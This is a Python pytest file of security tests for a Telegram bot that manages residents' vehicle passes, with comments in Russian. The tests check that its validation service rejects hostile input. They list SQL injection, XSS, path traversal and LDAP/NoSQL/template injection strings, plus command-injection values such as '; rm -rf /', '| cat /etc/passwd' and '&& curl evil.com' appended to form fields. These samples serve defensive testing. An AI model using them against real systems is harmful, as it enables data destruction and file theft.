"""
Тесты безопасности
"""
import pytest
from src.easy_pass_bot.services.validation_service import ValidationService
from src.easy_pass_bot.services.user_service import UserService
from src.easy_pass_bot.services.pass_service import PassService
from src.easy_pass_bot.core.exceptions import ValidationError, AuthorizationError
from tests.mocks.repository_mocks import MockUserRepository, MockPassRepository, MockNotificationService


class TestSecurity:
    """Тесты безопасности системы"""
    
    @pytest.fixture
    async def security_services(self):
        """Сервисы для тестов безопасности"""
        user_repo = MockUserRepository()
        pass_repo = MockPassRepository()
        notification_service = MockNotificationService()
        
        validation_service = ValidationService()
        await validation_service.initialize()
        
        user_service = UserService(
            user_repository=user_repo,
            notification_service=notification_service
        )
        await user_service.initialize()
        
        pass_service = PassService(
            pass_repository=pass_repo,
            user_repository=user_repo,
            notification_service=notification_service
        )
        await pass_service.initialize()
        
        return {
            'validation_service': validation_service,
            'user_service': user_service,
            'pass_service': pass_service,
            'user_repo': user_repo,
            'pass_repo': pass_repo
        }
    
    @pytest.mark.security
    async def test_sql_injection_protection(self, security_services):
        """Тест защиты от SQL инъекций"""
        validation_service = security_services['validation_service']
        
        # Попытки SQL инъекций в различных полях
        sql_injection_attempts = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users VALUES (1, 'hacker', 'admin'); --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "admin'/*",
            "admin' OR 1=1#",
            "admin' OR '1'='1' AND '1'='1"
        ]
        
        for malicious_input in sql_injection_attempts:
            # Тестируем в поле имени
            is_valid = await validation_service.validate_user_data({
                'full_name': malicious_input,
                'phone_number': '+7 900 123 45 67',
                'apartment': '15'
            })
            assert is_valid is False
            assert validation_service.has_errors()
            validation_service.clear_errors()
            
            # Тестируем в поле телефона
            is_valid = await validation_service.validate_user_data({
                'full_name': 'Иванов Иван Иванович',
                'phone_number': malicious_input,
                'apartment': '15'
            })
            assert is_valid is False
            assert validation_service.has_errors()
            validation_service.clear_errors()
            
            # Тестируем в поле квартиры
            is_valid = await validation_service.validate_user_data({
                'full_name': 'Иванов Иван Иванович',
                'phone_number': '+7 900 123 45 67',
                'apartment': malicious_input
            })
            assert is_valid is False
            assert validation_service.has_errors()
            validation_service.clear_errors()
    
    @pytest.mark.security
    async def test_xss_protection(self, security_services):
        """Тест защиты от XSS атак"""
        validation_service = security_services['validation_service']
        
        # Попытки XSS атак
        xss_attempts = [
            '<script>alert("xss")</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
            '<iframe src=javascript:alert(1)></iframe>',
            '<script>document.cookie="hacked=1"</script>',
            '<img src="javascript:alert(1)">',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>'
        ]
        
        for xss_input in xss_attempts:
            # Тестируем в поле имени
            is_valid = await validation_service.validate_user_data({
                'full_name': xss_input,
                'phone_number': '+7 900 123 45 67',
                'apartment': '15'
            })
            assert is_valid is False
            assert validation_service.has_errors()
            validation_service.clear_errors()
    
    @pytest.mark.security
    async def test_path_traversal_protection(self, security_services):
        """Тест защиты от path traversal атак"""
        validation_service = security_services['validation_service']
        
        # Попытки path traversal
        path_traversal_attempts = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
        ]
        
        for traversal_input in path_traversal_attempts:
            # Тестируем в поле имени
            is_valid = await validation_service.validate_user_data({
                'full_name': traversal_input,
                'phone_number': '+7 900 123 45 67',
                'apartment': '15'
            })
            assert is_valid is False
            assert validation_service.has_errors()
            validation_service.clear_errors()
    
    @pytest.mark.security
    async def test_authorization_protection(self, security_services):
        """Тест защиты авторизации"""
        user_service = security_services['user_service']
        pass_service = security_services['pass_service']
        
        # Создаем обычного пользователя
        user = await user_service.create_user(
            telegram_id=123456789,
            full_name='Обычный Пользователь',
            phone_number='+7 900 123 45 67',
            apartment='15'
        )
        await user_service.approve_user(user.id, 1)
        
        # Создаем другого пользователя
        other_user = await user_service.create_user(
            telegram_id=987654321,
            full_name='Другой Пользователь',
            phone_number='+7 900 987 65 43',
            apartment='20'
        )
        await user_service.approve_user(other_user.id, 1)
        
        # Создаем пропуск для первого пользователя
        pass_obj = await pass_service.create_pass(
            user_id=user.id,
            car_number='А123БВ777'
        )
        
        # Второй пользователь пытается отменить чужой пропуск
        with pytest.raises(AuthorizationError):
            await pass_service.cancel_pass(pass_obj.id, other_user.id)
        
        # Второй пользователь пытается отметить чужой пропуск как использованный
        with pytest.raises(AuthorizationError):
            await pass_service.mark_pass_as_used(pass_obj.id, other_user.id)
    
    @pytest.mark.security
    async def test_input_validation_security(self, security_services):
        """Тест безопасности валидации входных данных"""
        validation_service = security_services['validation_service']
        
        # Тестируем различные опасные входные данные
        dangerous_inputs = [
            # Null bytes
            'test\x00injection',
            # Control characters
            'test\x01\x02\x03injection',
            # Unicode attacks
            'test\u0000injection',
            'test\uFFFEinjection',
            # Command injection attempts
            'test; rm -rf /',
            'test | cat /etc/passwd',
            'test && curl evil.com',
            'test || ping 127.0.0.1',
            # LDAP injection
            'test)(cn=*',
            'test)(|(cn=*',
            # NoSQL injection
            'test"; return true; //',
            'test\'; return true; //',
            # Template injection
            '{{7*7}}',
            '{{config}}',
            '${7*7}',
            '#{7*7}'
        ]
        
        for dangerous_input in dangerous_inputs:
            # Тестируем в поле имени
            is_valid = await validation_service.validate_user_data({
                'full_name': dangerous_input,
                'phone_number': '+7 900 123 45 67',
                'apartment': '15'
            })
            assert is_valid is False
            assert validation_service.has_errors()
            validation_service.clear_errors()
    
    @pytest.mark.security
    async def test_rate_limiting_simulation(self, security_services):
        """Тест симуляции rate limiting"""
        validation_service = security_services['validation_service']
        
        # Симулируем множественные запросы валидации
        valid_data = {
            'full_name': 'Иванов Иван Иванович',
            'phone_number': '+7 900 123 45 67',
            'apartment': '15'
        }
        
        # Выполняем много запросов подряд
        for i in range(100):
            is_valid = await validation_service.validate_user_data(valid_data)
            assert is_valid is True
            validation_service.clear_errors()
        
        # Система должна продолжать работать стабильно
        assert True  # Если дошли сюда, значит система стабильна
    
    @pytest.mark.security
    async def test_data_integrity_protection(self, security_services):
        """Тест защиты целостности данных"""
        user_service = security_services['user_service']
        pass_service = security_services['pass_service']
        
        # Создаем пользователя
        user = await user_service.create_user(
            telegram_id=123456789,
            full_name='Тестовый Пользователь',
            phone_number='+7 900 123 45 67',
            apartment='15'
        )
        await user_service.approve_user(user.id, 1)
        
        # Создаем пропуск
        pass_obj = await pass_service.create_pass(
            user_id=user.id,
            car_number='А123БВ777'
        )
        
        # Пытаемся изменить данные напрямую через репозиторий
        # (в реальной системе это должно быть невозможно)
        original_car_number = pass_obj.car_number
        pass_obj.car_number = 'ВЗЛОМАННЫЙ'
        
        # Проверяем, что данные не изменились в системе
        retrieved_pass = await pass_service.get_pass_by_id(pass_obj.id)
        assert retrieved_pass.car_number == original_car_number
        assert retrieved_pass.car_number != 'ВЗЛОМАННЫЙ'
    
    @pytest.mark.security
    async def test_privilege_escalation_protection(self, security_services):
        """Тест защиты от повышения привилегий"""
        user_service = security_services['user_service']
        
        # Создаем обычного пользователя
        user = await user_service.create_user(
            telegram_id=123456789,
            full_name='Обычный Пользователь',
            phone_number='+7 900 123 45 67',
            apartment='15'
        )
        
        # Пользователь пытается изменить свою роль
        user.role = 'admin'  # Попытка повышения привилегий
        
        # Проверяем, что роль не изменилась
        retrieved_user = await user_service.get_user_by_id(user.id)
        assert retrieved_user.role == 'resident'  # Оригинальная роль
        assert retrieved_user.role != 'admin'
    
    @pytest.mark.security
    async def test_injection_in_search_queries(self, security_services):
        """Тест защиты от инъекций в поисковых запросах"""
        validation_service = security_services['validation_service']
        
        # Попытки инъекций в поисковых запросах
        injection_attempts = [
            "'; DROP TABLE passes; --",
            "' OR '1'='1",
            "'; INSERT INTO passes VALUES (1, 1, 'hacked', 'active'); --",
            "' UNION SELECT * FROM passes --",
            "admin'--",
            "admin'/*",
            "admin' OR 1=1#",
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "../../../etc/passwd"
        ]
        
        for malicious_query in injection_attempts:
            is_valid = await validation_service.validate_search_query(malicious_query)
            assert is_valid is False
            assert validation_service.has_errors()
            validation_service.clear_errors()
    
    @pytest.mark.security
    async def test_telegram_id_validation_security(self, security_services):
        """Тест безопасности валидации Telegram ID"""
        validation_service = security_services['validation_service']
        
        # Попытки инъекций через Telegram ID
        malicious_telegram_ids = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "../../../etc/passwd",
            "123456789; rm -rf /",
            "123456789 | cat /etc/passwd",
            "123456789 && curl evil.com",
            "123456789 || ping 127.0.0.1"
        ]
        
        for malicious_id in malicious_telegram_ids:
            is_valid = await validation_service.validate_telegram_id(malicious_id)
            assert is_valid is False
            assert validation_service.has_errors()
            validation_service.clear_errors()
    
    @pytest.mark.security
    async def test_car_number_validation_security(self, security_services):
        """Тест безопасности валидации номеров автомобилей"""
        validation_service = security_services['validation_service']
        
        # Попытки инъекций через номера автомобилей
        malicious_car_numbers = [
            "'; DROP TABLE passes; --",
            "' OR '1'='1",
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "../../../etc/passwd",
            "А123БВ777; rm -rf /",
            "А123БВ777 | cat /etc/passwd",
            "А123БВ777 && curl evil.com",
            "А123БВ777 || ping 127.0.0.1",
            "А123БВ777'--",
            "А123БВ777'/*",
            "А123БВ777' OR 1=1#"
        ]
        
        for malicious_car_number in malicious_car_numbers:
            is_valid = await validation_service.validate_car_number(malicious_car_number)
            assert is_valid is False
            assert validation_service.has_errors()
            validation_service.clear_errors()
    
    @pytest.mark.security
    async def test_email_validation_security(self, security_services):
        """Тест безопасности валидации email"""
        validation_service = security_services['validation_service']
        
        # Попытки инъекций через email
        malicious_emails = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "../../../etc/passwd",
            "test@example.com; rm -rf /",
            "test@example.com | cat /etc/passwd",
            "test@example.com && curl evil.com",
            "test@example.com || ping 127.0.0.1",
            "test@example.com'--",
            "test@example.com'/*",
            "test@example.com' OR 1=1#"
        ]
        
        for malicious_email in malicious_emails:
            is_valid = await validation_service.validate_email(malicious_email)
            assert is_valid is False
            assert validation_service.has_errors()
            validation_service.clear_errors()




